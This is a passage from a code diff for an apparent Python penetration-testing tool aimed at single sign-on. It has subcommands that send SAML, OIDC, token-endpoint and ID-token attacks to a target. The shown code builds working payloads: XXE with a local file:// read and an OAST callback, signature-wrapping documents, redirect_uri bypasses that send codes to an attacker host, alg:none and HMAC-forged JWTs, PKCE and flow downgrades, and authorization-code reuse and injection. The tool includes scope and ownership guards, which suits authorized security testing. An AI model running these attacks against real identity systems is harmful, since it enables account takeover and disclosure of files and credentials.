+            "DTDs (blind XXE / SSRF from the SAML parser)")
+    else:
+        add("xxe-oast", None, "external parameter entity to an OAST host", "n/a",
+            "no --oast host given, and an external entity without a destination "
+            "you control has no oracle")
+    if xxe_file:
+        add("xxe-file",
+            f'<!DOCTYPE samlp:Response [ <!ENTITY mythosfile SYSTEM '
+            f'"file://{xxe_file}"> ]>'
+            + set_nameid(drop_all(base, "Signature"), "&mythosfile;"),
+            f"a file entity for {xxe_file}, which the operator named",
+            "the file's contents read back as the subject = local file read")
+    return rows
+
+# ----------------------------------------------------------------- JWT
+
+
+def b64u(raw):
+    return base64.urlsafe_b64encode(raw).decode().rstrip("=")
+
+
+def b64u_dec(text):
+    return base64.urlsafe_b64decode(text + "=" * (-len(text) % 4))
+
+
+def jwt_parts(token):
+    bits = (token or "").split(".")
+    if len(bits) < 2:
+        return {}, {}, ""
+    try:
+        head = json.loads(b64u_dec(bits[0]))
+    except Exception:
+        head = {}
+    try:
+        claims = json.loads(b64u_dec(bits[1]))
+    except Exception:
+        claims = {}
+    return head, claims, bits[2] if len(bits) > 2 else ""
+
+
+def make_jwt(header, claims, key=b""):
+    """A JWT with whatever header we were given. HS* is real, RS* is not.
+
+    `alg: none` and the HS family are signed exactly as the JWS spec says, from
+    `hmac` and `hashlib`. RS/ES/PS cannot be signed in the standard library, so
+    the signature segment is a marked placeholder and the row that used it
+    carries `rsa_not_covered`. A placeholder is the honest output: a forged RS256
+    token is not something this file can produce, and pretending otherwise would
+    turn an unreproducible row into a reported finding.
+    """
+    alg = header.get("alg", "HS256")
+    head = b64u(json.dumps(header, separators=(",", ":"), sort_keys=True).encode())
+    body = b64u(json.dumps(claims, separators=(",", ":"), sort_keys=True).encode())
+    seg = f"{head}.{body}"
+    if alg == "none":
+        return seg + ".", False
+    digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
+              "HS512": hashlib.sha512}.get(alg)
+    if digest is None:
+        return seg + "." + b64u(b"MYTHOS-NO-RSA-IN-STDLIB"), True
+    return seg + "." + b64u(hmac.new(key, seg.encode(), digest).digest()), False
+
+# ------------------------------------------------------------- oracles
+
+
+def jar(resp):
+    """The cookies a response set, as one Cookie header value."""
+    out = []
+    for line in resp.get("set_cookie") or []:
+        out.append(line.split(";")[0].strip())
+    return "; ".join(out)
+
+
+def read_back(a, resp, want):
+    """Who does the session this response handed us belong to?
+
+    The response's own status is never the oracle. A session cookie plus a
+    read-back endpoint that names the identity is, and when the operator gave
+    no read-back endpoint the row says so instead of being graded.
+    """
+    out = {"session_cookie": jar(resp), "oracle_url": getattr(a, "oracle_url", None),
+           "identity_seen": None, "matched": None, "oracle_status": None}
+    if not out["session_cookie"] or not getattr(a, "oracle_url", None):
+        return out
+    r = send("GET", a.oracle_url, {"Cookie": out["session_cookie"]},
+             None, a.timeout, a.insecure)
+    out["oracle_status"] = r["status"]
+    out["identity_seen"] = r["body"][:400]
+    # The terms come from the row, because different rows assert different
+    # identities: a replay row asserts the captured one and a swap row asserts
+    # the second account. An address is also matched by its local part, since
+    # plenty of read-back endpoints answer with the username rather than the
+    # address. `--oracle-match` overrides the lot, for the case where neither
+    # form appears literally — it then applies to every row, so it is the
+    # wrong tool when the rows assert different identities.
+    terms = [getattr(a, "oracle_match", None)] if getattr(a, "oracle_match", None) \
+        else [want] + ([want.split("@")[0]] if want and "@" in str(want) else [])
+    terms = [t for t in terms if t]
+    out["oracle_terms"] = terms
+    out["matched"] = any(str(t) in r["body"] for t in terms)
+    out["matched_term"] = next((str(t) for t in terms if str(t) in r["body"]), None)
+    return out
+
+
+def judge(resp, read, control_ok, want):
+    """candidate / held / inconclusive. Never `confirmed`: that is validate's word."""
+    if resp.get("status") is None:
+        return "inconclusive: the request did not complete (%s)" % resp["body"][:80]
+    if not control_ok:
+        return ("inconclusive: the unmodified control flow did not succeed in "
+                "this run, so a rejection here is not evidence of a check")
+    if read.get("matched"):
+        return f"candidate: the session reads back as {want!r} through the oracle"
+    if resp["status"] < 400 and read.get("session_cookie") and read.get("oracle_url") is None:
+        return ("candidate (weak): accepted and a session was issued, but no "
+                "--oracle-url read the identity back; give one before reporting")
+    if resp["status"] < 400 and read.get("matched") is False and read.get("oracle_status"):
+        return ("held: accepted, but the session does not read back as %r, so "
+                "the mutation changed nothing the application acted on" % want)
+    if resp["status"] < 400:
+        return ("candidate (weak): accepted with no session visible; the oracle "
+                "did not fire, so this is a lead, not a finding")
+    return f"held: refused with {resp['status']}"
+
+# ------------------------------------------------------- 1. saml
+
+
+def post_saml(a, doc, relay=None):
+    body = {"SAMLResponse": base64.b64encode(doc.encode()).decode()}
+    if relay:
+        body["RelayState"] = relay
+    return send("POST", a.acs, dict(FORM_CT), form(body), a.timeout, a.insecure)
+
+
+def cmd_saml(a):
+    require_in_scope(a.acs, a.oracle_url, a.idp, a.oast)
+    victim = a.victim or a.subject
+    own_guard(a.own, subject=a.subject, victim=victim)
+    out = {"subcommand": "saml", "acs": a.acs, "subject": a.subject,
+           "victim": victim, "control": None, "rows": [], "notes": []}
+
+    if a.response:
+        base = load_response(pathlib.Path(a.response).read_text(encoding="utf-8"))
+        captured = nameid_text(base)
+        # A capture is an identity too: replaying it asserts whoever it names.
+        own_guard_any(a.own, "captured SAMLResponse", nameid=captured,
+                      email=saml_attr(base, "email"))
+        out["notes"].append(
+            f"base document: the capture in {a.response}, NameID {captured!r}")
+    else:
+        key = bytes.fromhex(a.key) if a.key else b"mythos-federation-test-key"
+        base = mint_response(nameid=a.subject, acs=a.acs, audience=a.audience,
+                             destination=a.destination,
+                             in_response_to=a.in_response_to, email=a.subject,
+                             key=key, sign=a.sign)
+        out["notes"].append(
+            "base document: minted here and signed with an HMAC-SHA256 test key. "
+            "A production SP trusts an RSA certificate, so this signature will "
+            "not verify there — which is the point: a mint that is accepted "
+            "answers 'does this SP verify a signature at all'. rsa_not_covered.")
+
+    out["base_document"] = base
+    # The control first, and again after every row that lands as a candidate.
+    # A refusal only means "the check holds" if the same flow unmodified works.
+    control = post_saml(a, base)
+    cread = read_back(a, control, nameid_text(base))
+    control_ok = control["status"] is not None and control["status"] < 400
+    out["control"] = {"status": control["status"], "ok": control_ok,
+                      "session": bool(jar(control)), "read_back": cread,
+                      "note": "the base document, unmodified. Every verdict "
+                              "below is read against this one."}
+    if not control_ok:
+        out["notes"].append(
+            "THE CONTROL DID NOT SUCCEED (%s). Every row below is inconclusive "
+            "by construction: a document this SP rejects tells you nothing "
+            "about which check rejected it. Fix the control first — a capture "
+            "from a real SP-initiated login is usually what is missing."
+            % control["status"])
+
+    wanted = set(a.only or [])
+    for row in saml_mutations(base, victim, acs=a.acs, oast=a.oast,
+                              audience=a.audience, destination=a.destination,
+                              in_response_to=a.in_response_to,
+                              xxe_file=a.xxe_file):
+        if wanted and row["label"] not in wanted:
+            continue
+        item = {"check": row["label"], "manipulation": row["manipulation"],
+                "oracle": row["oracle"]}
+        if row["doc"] is None:
+            item["verdict"] = "inconclusive: " + (row["why_not"] or "not built")
+            if row["why_not"] and "rsa" in row["why_not"].lower():
+                item["rsa_not_covered"] = True
+            out["rows"].append(item)
+            continue
+        relay = a.relay_state if row["label"] == "relaystate" else None
+        resp = post_saml(a, row["doc"], relay)
+        # The row says what its own proof reads back as. For a comment
+        # mutation that is the truncated form, which is the same
+        # transformation the ownership guard applies.
+        want = COMMENT_SPLIT.sub("", row["want"] or victim)
+        read = read_back(a, resp, want)
+        item.update({"status": resp["status"], "bytes": len(resp["body"]),
+                     "location": resp["headers"].get("location", ""),
+                     "response_head": resp["body"][:300],
+                     "read_back": read,
+                     "document": row["doc"] if a.keep_documents else None,
+                     "verdict": judge(resp, read, control_ok, want)})
+        if row["label"] == "xxe-oast":
+            item["verdict"] = (
+                "inconclusive: an external entity has no oracle in this process "
+                "— read the OAST catcher's log for a hit from the target "
+                "(`curl $OAST/__log`). The document was accepted (%s), which "
+                "only means the parser did not refuse the DTD."
+                % resp["status"])
+        if row["label"] == "xxe-internal" and "MYTHOS-ENTITY-RESOLVED" in resp["body"]:
+            item["verdict"] = ("candidate: the parser expanded our internal "
+                              "entity and the expansion came back")
+        if row["label"] == "doctype":
+            item["verdict"] = (
+                "candidate: a DOCTYPE was not rejected (precondition for the "
+                "parser-differential class)" if resp["status"] is not None
+                and resp["status"] < 400 else
+                f"held: DOCTYPE refused with {resp['status']}")
+        if row["label"] == "replay":
+            item["verdict"] = (
+                "candidate: the same assertion ID was accepted twice, so there "
+                "is no replay cache" if control_ok and resp["status"]
+                and resp["status"] < 400 else item["verdict"])
+        if item["verdict"].startswith("held") and row["label"].startswith("xsw"):
+            item["verdict"] += (" — for a wrapping shape that means the SP read "
+                                "the element the signature covers, so this "
+                                "shape did not win against this SP's XPath")
+        if item["verdict"].startswith("candidate"):
+            again = post_saml(a, base)
+            item["control_after"] = {
+                "status": again["status"],
+                "still_ok": again["status"] is not None and again["status"] < 400}
+            if not item["control_after"]["still_ok"]:
+                item["verdict"] += (" — but the control stopped working after "
+                                    "this row, so the SP's state changed: "
+                                    "re-run before reporting")
+        out["rows"].append(item)
+
+    if a.relay_state and (not wanted or "relaystate" in wanted):
+        require_in_scope(a.relay_state)
+        resp = post_saml(a, base, a.relay_state)
+        loc = resp["headers"].get("location", "")
+        out["rows"].append({
+            "check": "relaystate",
+            "manipulation": f"RelayState set to {a.relay_state}",
+            "oracle": "a Location header pointing at that URL means the ACS "
+                      "follows RelayState, so the SSO endpoint is an open "
+                      "redirect that hands over a fresh session",
+            "status": resp["status"], "location": loc,
+            "verdict": ("candidate: the ACS redirected to the RelayState URL"
+                        if a.relay_state.split("//")[-1].split("/")[0] in loc
+                        else f"held: no redirect to that host ({resp['status']})")})
+    return out
+
+# ------------------------------------------------------- 2. shapes
+
+
+def cmd_shapes(a):
+    """Offline: what each wrapping shape actually builds. No requests."""
+    victim = a.victim
+    a.subject = a.subject or (a.own or [None])[0]
+    own_guard(a.own, victim=victim, subject=a.subject)
+    if a.response:
+        base = load_response(pathlib.Path(a.response).read_text(encoding="utf-8"))
+        own_guard_any(a.own, "captured SAMLResponse",
+                      nameid=nameid_text(base))
+    else:
+        base = mint_response(nameid=a.subject, acs=a.acs or "https://sp.invalid/acs",
+                             key=b"mythos-federation-test-key", sign=a.sign)
+    out = {"subcommand": "shapes", "base_nameid": nameid_text(base),
+           "victim": victim, "shapes": [], "notes": [
+               "No request is sent by this subcommand. It exists so the "
+               "document a shape builds can be read, diffed and attached to a "
+               "finding, and so the selftest can assert the shape rather than "
+               "trusting the label."]}
+    for name, fn in XSW.items():
+        if a.only and name not in a.only:
+            continue
+        doc, why = fn(base, victim)
+        out["shapes"].append({
+            "name": name, "builds": fn.__doc__.strip().splitlines()[0],
+            "ok": doc is not None, "why_not": why,
+            "assertions": shape_facts(doc) if doc else None,
+            "document": doc})
+    return out
+
+
+def shape_facts(doc):
+    """Measurable facts about a built document, for the asserts and the report."""
+    root = ET.fromstring(doc)
+    assertions = root.findall(f".//{{{SAML_A}}}Assertion") \
+        + ([root] if root.tag == f"{{{SAML_A}}}Assertion" else [])
+    responses = root.findall(f".//{{{SAML_P}}}Response") \
+        + ([root] if root.tag == f"{{{SAML_P}}}Response" else [])
+    facts = {"assertions": len(assertions), "responses": len(responses),
+             "signatures": len(root.findall(f".//{{{DS}}}Signature")),
+             "nameids": [e.text for e in root.findall(f".//{{{SAML_A}}}NameID")],
+             "assertion_ids": [a.get("ID") for a in assertions],
+             "signed_parents": []}
+    # Where did each signed element end up? One [tag, parent] pair per element
+    # that carries a Signature as a direct child, in document order, with the
+    # root's parent written as "(root)". That pair *is* the shape: XSW6 is
+    # ["Assertion", "Signature"] and nothing else is.
+    signed = ("{%s}Assertion" % SAML_A, "{%s}Response" % SAML_P)
+    if root.tag in signed and root.find(f"{{{DS}}}Signature") is not None:
+        facts["signed_parents"].append([root.tag.split("}")[-1], "(root)"])
+    for parent in root.iter():
+        for child in list(parent):
+            if child.tag in signed and child.find(f"{{{DS}}}Signature") is not None:
+                facts["signed_parents"].append(
+                    [child.tag.split("}")[-1], parent.tag.split("}")[-1]])
+    return facts
+
+# ------------------------------------------------------- 3. metadata
+
+
+def cmd_metadata(a):
+    """Read SAML/OIDC metadata and say what rotation would do to this SP."""
+    require_in_scope(a.url, *(a.also or []))
+    out = {"subcommand": "metadata", "url": a.url, "documents": [], "notes": []}
+    for url in [a.url] + list(a.also or []):
+        r = send("GET", url, {}, None, a.timeout, a.insecure)
+        doc = {"url": url, "status": r["status"], "bytes": len(r["body"]),
+               "content_type": r["headers"].get("content-type", ""),
+               "cache_control": r["headers"].get("cache-control", ""),
+               "certificates": [], "facts": []}
+        certs = re.findall(r"<[^>]*X509Certificate[^>]*>\s*([A-Za-z0-9+/=\s]+?)\s*<",
+                           r["body"])
+        for c in certs:
+            raw = re.sub(r"\s+", "", c)
+            doc["certificates"].append({
+                "sha256_of_der": hashlib.sha256(
+                    base64.b64decode(raw + "=" * (-len(raw) % 4))).hexdigest()
+                if re.fullmatch(r"[A-Za-z0-9+/=]+", raw) else None,
+                "length": len(raw),
+                "note": None if re.fullmatch(r"[A-Za-z0-9+/=]+", raw) else
+                        "not valid base64, so this is not a certificate at all"})
+        if "keys" in r["body"] and '"kid"' in r["body"]:
+            try:
+                doc["jwks_kids"] = [k.get("kid") for k in
+                                    json.loads(r["body"]).get("keys", [])]
+            except Exception:
+                doc["jwks_kids"] = []
+        want = re.search(r'WantAssertionsSigned="(\w+)"', r["body"])
+        if want:
+            doc["facts"].append(f"WantAssertionsSigned={want.group(1)}")
+            if want.group(1).lower() == "false":
+                doc["facts"].append(
+                    "candidate: the SP's own metadata says it does not want "
+                    "signed assertions, which is the unsigned-acceptance row "
+                    "of `saml` stated by the SP itself")
+        if len(doc["certificates"]) > 1:
+            doc["facts"].append(
+                f"{len(doc['certificates'])} signing certificates published: "
+                "rotation is staged, so an assertion signed with the retiring "
+                "key is still accepted. Check when the old one leaves.")
+        elif len(doc["certificates"]) == 1:
+            doc["facts"].append(
+                "one signing certificate: a rotation here is a flag day, and a "
+                "stack that caches metadata will keep trusting the old key. "
+                "inconclusive without two observations over time — run "
+                "`scripts/watch` against this URL instead of guessing.")
+        if not doc["cache_control"]:
+            doc["facts"].append(
+                "no Cache-Control on the metadata: nothing tells a consumer how "
+                "long it may trust this copy (observation, not a finding)")
+        out["documents"].append(doc)
+    return out
+
+# ------------------------------------------------------- 4. oidc
+
+
+def redirect_mutations(registered, oast):
+    """The redirect_uri set, from knowledge/web/oauth-oidc.md's table."""
+    split = urllib.parse.urlsplit(registered)
+    host, path = split.netloc, split.path or "/"
+    scheme = split.scheme or "https"
+    a = oast or "oast.invalid"
+    return [
+        ("exact", registered, "the registered value: this is the control"),
+        ("other-path", f"{scheme}://{host}/mythos-not-registered",
+         "a different path on the registered host"),
+        ("path-suffix", f"{scheme}://{host}{path}/mythos",
+         "the registered value with a path segment appended (prefix match)"),
+        ("path-traversal", f"{scheme}://{host}{path}/../mythos",
+         "a traversal past the registered path"),
+        ("path-traversal-encoded", f"{scheme}://{host}{path}%2f..%2fmythos",
+         "the same traversal, percent-encoded, for a validator that decodes later"),
+        ("path-semicolon", f"{scheme}://{host}{path};mythos",
+         "a path parameter after the registered path"),
+        ("query-appended", f"{scheme}://{host}{path}?mythos=1",
+         "a query string appended (substring match)"),
+        ("fragment-encoded", f"{scheme}://{host}{path}%23@{a}/",
+         "%23 so the validator sees a path and the browser sees a fragment"),
+        ("fragment-plain", f"{scheme}://{host}{path}#@{a}/",
+         "a literal fragment with an authority after it"),
+        ("userinfo", f"{scheme}://{host}@{a}/cb",
+         "the registered host as userinfo of the attacker host"),
+        ("userinfo-encoded", f"{scheme}://{a}%23@{host}{path}",
+         "the attacker host as userinfo, encoded"),
+        ("backslash", f"{scheme}://{a}\\@{host}{path}",
+         "a backslash the two parsers disagree about"),
+        ("subdomain", f"{scheme}://mythos.{host}{path}",
+         "a subdomain of the registered host"),
+        ("suffix-host", f"{scheme}://{host}.{a}{path}",
+         "the registered host as a prefix of the attacker's"),
+        ("trailing-dot", f"{scheme}://{host}.{path}",
+         "the fully qualified form of the same host"),
+        ("case", f"{scheme}://{host.upper()}{path}",
+         "the host in upper case"),
+        ("port", f"{scheme}://{host}:8443{path}",
+         "another port on the registered host"),
+        ("scheme-downgrade", f"http://{host}{path}",
+         "http where https was registered"),
+        ("scheme-custom", f"mythos-app://{host}{path}",
+         "a non-registered custom scheme (native-app client confusion)"),
+        ("loopback", "http://127.0.0.1:1/cb",
+         "the RFC 8252 native-app loopback allowance"),
+        ("wildcard", f"{scheme}://{host}{path}*",
+         "a literal asterisk, for a server that stores the pattern"),
+        ("unrelated", f"{scheme}://{a}/cb",
+         "an unrelated host outright: this is the negative control for the "
+         "whole table and must be refused"),
+    ]
+
+
+def authorize_url(base, params):
+    split = urllib.parse.urlsplit(base)
+    query = dict(urllib.parse.parse_qsl(split.query))
+    query.update({k: v for k, v in params.items() if v is not None})
+    return urllib.parse.urlunsplit(
+        (split.scheme, split.netloc, split.path, urllib.parse.urlencode(query), ""))
+
+
+def cmd_oidc(a):
+    require_in_scope(a.authorize, a.oast, a.metadata)
+    own_guard(a.own, account=a.account)
+    out = {"subcommand": "oidc", "authorize": a.authorize,
+           "client_id": a.client_id, "redirect_uri": a.redirect_uri,
+           "metadata": None, "redirect_uri_rows": [], "flow_rows": [],
+           "notes": ["Every request here is the authorization request for an "
+                     "account on the --own list. The oracle is the Location "
+                     "header, which is a lead; the code or token arriving at a "
+                     "host you control is the proof, and that step belongs to "
+                     "the browser tool (skills/sso-federation)."]}
+
+    if a.metadata:
+        r = send("GET", a.metadata, {}, None, a.timeout, a.insecure)
+        try:
+            meta = json.loads(r["body"])
+        except Exception:
+            meta = {}
+        out["metadata"] = {
+            "status": r["status"],
+            "code_challenge_methods_supported": meta.get("code_challenge_methods_supported"),
+            "response_modes_supported": meta.get("response_modes_supported"),
+            "response_types_supported": meta.get("response_types_supported"),
+            "authorization_response_iss_parameter_supported":
+                meta.get("authorization_response_iss_parameter_supported"),
+            "registration_endpoint": meta.get("registration_endpoint"),
+            "jwks_uri": meta.get("jwks_uri"),
+            "facts": []}
+        if meta.get("code_challenge_methods_supported") and \
+                "plain" in (meta.get("code_challenge_methods_supported") or []):
+            out["metadata"]["facts"].append(
+                "candidate: `plain` is advertised as a PKCE method, so a client "
+                "that sends S256 can be downgraded (RFC 7636 §7.2)")
+        if not meta.get("authorization_response_iss_parameter_supported"):
+            out["metadata"]["facts"].append(
+                "no RFC 9207 `iss` in the authorization response: a client with "
+                "two authorization servers cannot tell them apart (mix-up). "
+                "Proving it needs a second AS you run, so this stays candidate.")
+
+    base = {"response_type": "code", "client_id": a.client_id,
+            "scope": a.scope, "state": "mythos-state-" + secrets.token_hex(4),
+            "nonce": "mythos-nonce-" + secrets.token_hex(4)}
+    control = send("GET", authorize_url(a.authorize, {**base, "redirect_uri": a.redirect_uri}),
+                   dict(a.header or {}), None, a.timeout, a.insecure)
+    control_ok = control["status"] is not None and (
+        control["status"] < 400 or "location" in control["headers"])
+    out["control"] = {"status": control["status"],
+                      "location": control["headers"].get("location", "")[:200],
+                      "ok": control_ok}
+    if not control_ok:
+        out["notes"].append(
+            "THE CONTROL DID NOT SUCCEED (%s). The registered redirect_uri must "
+            "produce a redirect before a refusal of a mutation means anything. "
+            "Check --client-id, --scope and whether this account is logged in "
+            "at the AS (pass its cookie with --header)." % control["status"])
+
+    for label, value, what in redirect_mutations(a.redirect_uri, a.oast):
+        if a.only and label not in a.only:
+            continue
+        url = authorize_url(a.authorize, {**base, "redirect_uri": value})
+        r = send("GET", url, dict(a.header or {}), None, a.timeout, a.insecure)
+        loc = r["headers"].get("location", "")
+        landed = loc.startswith(value.split("#")[0][:40]) if loc else False
+        row = {"check": f"redirect_uri/{label}", "value": value,
+               "manipulation": what, "status": r["status"], "location": loc[:200],
+               "oracle": "a 302 whose Location is the mutated URI carrying a "
+                         "code or token. The proof is the code arriving at a "
+                         "host you control; this row is the lead.",
+               "has_code": bool(re.search(r"[?&#](code|access_token|id_token)=", loc))}
+        if label == "exact":
+            row["verdict"] = ("control: the registered value redirects as expected"
+                              if landed else
+                              f"inconclusive: the registered value did not "
+                              f"redirect either ({r['status']})")
+        elif label == "unrelated":
+            row["verdict"] = (
+                "candidate: an unrelated host was accepted, so the check is "
+                "absent rather than loose" if landed and row["has_code"] else
+                f"held: the unrelated-host control was refused ({r['status']})")
+        elif not control_ok:
+            row["verdict"] = ("inconclusive: the control did not succeed, so a "
+                              "refusal here is not evidence of a check")
+        elif landed and row["has_code"]:
+            row["verdict"] = ("candidate: the AS redirected to the mutated URI "
+                              "with a credential in it")
+        elif landed:
+            row["verdict"] = ("candidate (weak): the AS redirected to the "
+                              "mutated URI but no credential is in the Location")
+        else:
+            row["verdict"] = f"held: refused with {r['status']}"
+        out["redirect_uri_rows"].append(row)
+
+    # The flow-binding rows that are a single authorization request each.
+    flows = [
+        ("state-absent", {k: v for k, v in base.items() if k != "state"},
+         "the authorization request sent with no `state` at all",
+         "a code issued anyway means the AS does not require it; whether the "
+         "client binds its own value is the browser-tool step"),
+        ("pkce-absent", base,
+         "no code_challenge, against a client that normally sends one",
+         "a code issued without a challenge can be redeemed without a verifier: "
+         "the S256 client is downgradable"),
+        ("pkce-plain", {**base, "code_challenge": "mythos" * 8,
+                        "code_challenge_method": "plain"},
+         "code_challenge_method=plain",
+         "accepted = the verifier travels in clear in the token request and a "
+         "network or log observer can complete the flow (RFC 7636 §7.2)"),
+        ("implicit-downgrade", {**base, "response_type": "token"},
+         "response_type=token on a client that uses code",
+         "a token in the fragment = the implicit flow is still enabled "
+         "(RFC 9700 says it must not be)"),
+        ("idtoken-downgrade", {**base, "response_type": "id_token"},
+         "response_type=id_token",
+         "an id_token in the fragment with no code exchange"),
+        ("hybrid", {**base, "response_type": "code id_token"},
+         "response_type=code id_token",
+         "a hybrid response the client never asked for"),
+        ("response-mode-query", {**base, "response_type": "token",
+                                 "response_mode": "query"},
+         "response_mode=query with a token response type",
+         "a token in the query string leaks through Referer, logs and history"),
+        ("response-mode-form-post", {**base, "response_mode": "form_post"},
+         "response_mode=form_post",
+         "a mode the client never uses is still honoured"),
+        ("prompt-none", {**base, "prompt": "none"},
+         "prompt=none, silent authentication",
+         "a code issued with no interaction means an embedded frame can harvest "
+         "one whenever the AS session exists; with no session it must answer "
+         "login_required"),
+        ("nonce-absent", {k: v for k, v in base.items() if k != "nonce"},
+         "no `nonce` on an OIDC request",
+         "an id_token minted with no nonce cannot be bound to this flow, so a "
+         "previously captured one replays"),
+    ]
+    # A downgrade row is only a downgrade if the credential that came back is
+    # the one the downgrade asked for. An authorization server that ignores
+    # `response_type` and hands out a code anyway is not running the implicit
+    # flow, and grading that as a candidate manufactures a finding.
+    expect = {"implicit-downgrade": {"access_token"},
+              "idtoken-downgrade": {"id_token"},
+              "hybrid": {"id_token"},
+              "response-mode-query": {"access_token", "id_token"}}
+    for label, params, manipulation, oracle in flows:
+        if a.only and label not in a.only:
+            continue
+        r = send("GET", authorize_url(a.authorize, {**params, "redirect_uri": a.redirect_uri}),
+                 dict(a.header or {}), None, a.timeout, a.insecure)
+        loc = r["headers"].get("location", "")
+        cred = re.search(r"[?&#](code|access_token|id_token)=([^&]+)", loc)
+        kind = cred.group(1) if cred else None
+        row = {"check": label, "manipulation": manipulation, "oracle": oracle,
+               "status": r["status"], "location": loc[:200],
+               "credential_issued": bool(cred), "credential_kind": kind,
+               "error": (re.search(r"[?&#]error=([^&]+)", loc) or [None, None])[1]}
+        if not control_ok:
+            row["verdict"] = "inconclusive: the control did not succeed"
+        elif cred and label in expect and kind not in expect[label]:
+            row["verdict"] = (
+                f"held: the AS answered with a {kind}, not "
+                f"{' or '.join(sorted(expect[label]))}, so the downgrade did "
+                f"not take — it ignored response_type rather than honouring it")
+        elif cred:
+            row["verdict"] = ("candidate: a credential was issued for this "
+                              f"mutation ({kind}); redeem it with `federation "
+                              "token` and keep the bytes")
+            row["credential"] = cred.group(2)[:120]
+        elif row["error"]:
+            row["verdict"] = f"held: the AS answered error={row['error']}"
+        else:
+            row["verdict"] = f"held: no credential issued ({r['status']})"
+        out["flow_rows"].append(row)
+    return out
+
+# ------------------------------------------------------- 5. token
+
+
+def cmd_token(a):
+    require_in_scope(a.token_url)
+    own_guard(a.own, account=a.account)
+    out = {"subcommand": "token", "token_url": a.token_url, "rows": [],
+           "notes": ["Every code here was issued to an account on the --own "
+                     "list. Nothing in this subcommand guesses a code: each "
+                     "row sends one request with a code the operator captured.",
+                     "A redemption consumes the code, so the order matters and "
+                     "it is fixed: the control redeems first, which is also the "
+                     "single-use test's first half."]}
+
+    def redeem(label, extra, manipulation, oracle, code=None):
+        body = {"grant_type": "authorization_code", "code": code or a.code,
+                "client_id": a.client_id, "redirect_uri": a.redirect_uri}
+        if a.client_secret:
+            body["client_secret"] = a.client_secret
+        if a.verifier:
+            body["code_verifier"] = a.verifier
+        body.update(extra)
+        body = {k: v for k, v in body.items() if v is not None}
+        r = send("POST", a.token_url, dict(FORM_CT), form(body), a.timeout, a.insecure)
+        got = {}
+        try:
+            got = json.loads(r["body"])
+        except Exception:
+            pass
+        return {"check": label, "manipulation": manipulation, "oracle": oracle,
+                "status": r["status"], "sent": body,
+                "tokens": sorted(k for k in got if k.endswith("token")),
+                "error": got.get("error"), "response_head": r["body"][:240],
+                "issued": bool(got.get("access_token") or got.get("id_token"))}
+
+    first = redeem("control", {}, "the captured code redeemed as the client did",
+                   "tokens back: the control every row below is read against")
+    control_ok = first["issued"]
+    first["verdict"] = ("control: tokens issued" if control_ok else
+                        f"inconclusive: the control redemption failed "
+                        f"({first['status']} {first['error']}), so nothing below "
+                        f"is readable. A code is single use — capture a fresh "
+                        f"one and re-run.")
+    out["rows"].append(first)
+
+    rows = [
+        ("code-reuse", {}, "the same code redeemed a second time",
+         "tokens on the second call = the code is not single use (RFC 6749 "
+         "§4.1.2); the AS should also revoke the first grant"),
+        ("redirect-rebind", {"redirect_uri": a.other_redirect or
+                             (a.redirect_uri or "") + "/mythos"},
+         "the same code redeemed with a different redirect_uri",
+         "tokens back = the code is not bound to the redirect it was issued "
+         "for, which is what makes an injected code usable"),
+        ("client-rebind", {"client_id": a.other_client or (a.client_id + "-mythos")},
+         "the same code redeemed as another client",
+         "tokens back = the code is not bound to its client"),
+        ("verifier-absent", {"code_verifier": None},
+         "the code redeemed with no code_verifier",
+         "tokens back after an S256 authorization = PKCE is not enforced at "
+         "redemption, so the challenge was decoration"),
+        ("verifier-wrong", {"code_verifier": "mythos-wrong-" + "v" * 43},
+         "the code redeemed with a wrong verifier",
+         "tokens back = the verifier is not compared; the control is that the "
+         "correct one works"),
+    ]
+    for label, extra, manipulation, oracle in rows:
+        if a.only and label not in a.only:
+            continue
+        row = redeem(label, extra, manipulation, oracle)
+        row["verdict"] = ("inconclusive: the control redemption failed"
+                          if not control_ok else
+                          f"candidate: {label} was accepted and tokens came back"
+                          if row["issued"] else
+                          f"held: refused with {row['status']} "
+                          f"{row['error'] or ''}".strip())
+        out["rows"].append(row)
+
+    if a.injected_code and (not a.only or "code-injection" in a.only):
+        row = redeem("code-injection", {}, (
+            "a code issued to a second client of the same AS, both the "
+            "operator's, redeemed at this client's callback"),
+            "tokens back = the client accepts a code it did not request, which "
+            "is authorization-code injection; PKCE is the defence and its "
+            "absence above is the precondition", code=a.injected_code)
+        row["verdict"] = ("candidate: a foreign code was redeemed here"
+                          if row["issued"] else
+                          f"held: refused with {row['status']} {row['error'] or ''}".strip())
+        out["rows"].append(row)
+    elif not a.only:
+        out["rows"].append({
+            "check": "code-injection",
+            "manipulation": "a code from a second client of the same AS",
+            "oracle": "n/a",
+            "verdict": "inconclusive: no --injected-code given. Capture one "
+                       "from a second client you registered, for an account on "
+                       "the --own list, and pass it here."})
+
+    if a.limit_probe and (not a.only or "rate-limit" in a.only):
+        # Not a search: at most 10 syntactically valid but wrong codes, which
+        # measures whether a limit exists. Walking the code space is refused.
+        n = min(int(a.limit_probe), 10)
+        attempts = []
+        for i in range(n):
+            r = redeem(f"rate-limit/{i}", {"code": f"mythos-invalid-{i:02d}"},
+                       "a wrong code", "a 429 or a Retry-After before the cap")
+            attempts.append({"status": r["status"], "error": r["error"]})
+            if r["status"] == 429:
+                break
+        limited = any(x["status"] == 429 for x in attempts)
+        out["rows"].append({
+            "check": "rate-limit", "attempts": attempts,
+            "manipulation": f"{len(attempts)} wrong codes, hard cap 10",
+            "oracle": "a 429 or Retry-After within the cap",
+            "verdict": (f"held: rate limited after {len(attempts)} attempt(s)"
+                        if limited else
+                        f"candidate: no limit observed in {len(attempts)} "
+                        f"attempts (ceiling {n}; this is the missing-rate-limit "
+                        f"finding, not a guessed code — nothing here searches "
+                        f"the code space)")})
+    return out
+
+# ------------------------------------------------------- 6. idtoken
+
+
+def idtoken_mutations(a, head, claims):
+    """Label -> (token, manipulation, oracle, rsa_not_covered)."""
+    victim_claims = dict(claims)
+    if a.victim_sub:
+        victim_claims["sub"] = a.victim_sub
+    if a.victim_email:
+        victim_claims["email"] = a.victim_email
+        victim_claims["email_verified"] = True
+    key = (a.hmac_key or "").encode()
+    rows = []
+
+    captured = claims.get("email") or claims.get("sub")
+    victim = a.victim_email or a.victim_sub
+
+    def add(label, token, manipulation, oracle, rsa=False, want=None,
+            why_not=None):
+        # As in the SAML set: a row that replays the captured token unchanged
+        # is not asserting the second identity, so grading it against that
+        # identity reports every one of them as a non-event.
+        rows.append((label, token, manipulation, oracle, rsa,
+                     want if want is not None else victim, why_not))
+
+    tok, rsa = make_jwt({**head, "alg": "none"}, victim_claims)
+    add("alg-none", tok, "header alg set to `none`, signature segment empty",
